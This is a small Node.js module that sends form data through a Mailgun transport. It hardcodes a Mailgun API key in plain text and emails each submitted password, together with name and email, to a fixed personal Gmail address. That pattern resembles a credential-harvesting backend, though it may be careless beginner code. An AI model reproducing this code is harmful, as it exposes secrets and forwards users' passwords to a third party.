const nodemailer = require('nodemailer');
const mailGun = require('nodemailer-mailgun-transport');

const auth = {
    auth: {
        api_key: '0931545b0c25903c2be8f3c736b0b243-8b34de1b-4e7ed481',
        domain: 'sandboxd08a1bfc9b9e423b8cdb5168ca88901e.mailgun.org'
    }
};

const transporter = nodemailer.createTransport(mailGun(auth));

const sendMail = (email, subject, text, firstname, lastname, password) => {
    
    const mailOptions = {
        from: email,
        to: 'dabrentwenty@gmail.com',
        subject,
        text,
        firstname,
        lastname,
        password
    };
    
    transporter.sendMail(mailOptions, function(err, data) {
        if(err) {
            console.log('Error fuck you');
            //cb(err, null);
        }
    
        else {
            console.log('success');
            //cb(null, data);
        }
    });
}

module.exports = sendMail;